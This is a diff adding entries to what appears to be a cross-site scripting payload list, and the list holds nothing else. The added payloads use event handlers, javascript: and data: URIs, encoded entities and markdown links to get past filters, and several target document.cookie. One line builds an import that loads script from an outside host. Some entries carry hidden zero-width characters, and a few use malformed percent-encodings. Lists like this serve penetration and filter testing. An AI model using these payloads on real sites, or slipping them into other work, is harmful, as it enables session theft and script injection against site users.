@@ -48,4 +48,24 @@ ellm1%3cscript%3ealert(1)%3c%2fscript%3ec2xwc
 "><iNput///type="password"////id="CF-bypaSS" name="query"////value=""///oNfocUs​="alert('hello')" AutOfoCus="" />
 &lt;img longdesc="src='x'onerror​=alert(document.domain);//&gt;&lt;img " src='showme'&gt;
 <dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
+<math><x xlink:href=javascript​:confirm`1`>click
+<button%20popovertarget=x>Click%20me</button><img%20onbeforetoggle=alert(1)%20popover%20id=x>XSS
+<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click
 
+<svg width="600" height="400" xmlns="http://w3.org/2000/svg" xmlns:xhtml="http://w3.org/1999/xhtml">
+ <foreignObject width="100%" height="100%">
+ <body xmlns="http://w3.org/1999/xhtml"> <iframe src='javascript​:confirm(10)'></iframe> </body> </foreignObject> </svg>
+
+[a](javascript​:prompt(document.cookie))
+[a](j a v a s c r i p t:prompt(document.cookie))
+<&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74​&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+![a'"`onerror=prompt(document.cookie)](x)
+[notmalicious](javascript​:window.onerror=alert;throw%20document.cookie)
+[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
+![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
+
+<​script>a="import\x28"<​/script> <​script>b="`//0-a\x2e"<​/script> <​script>c="nl`\x29"<​/script><​script>d=setTimeout<​/script><​script>e=eval<​/script><​script>f=`${a}${b}${c}`<​/script><​script>d`e\x28f\x29`<​/script>
+
+<​style>@keyframes a{}b{animation:a;}<​/style><b/onanimationstart​=prompt`${document.domain}&#x60;>
+<Svg%K9OnLoad=%7Krompt%6K1%6K>
+d=document,b='`',d['loca'+'tion']='javascript​&colon;aler'+'t'+b+domain+b
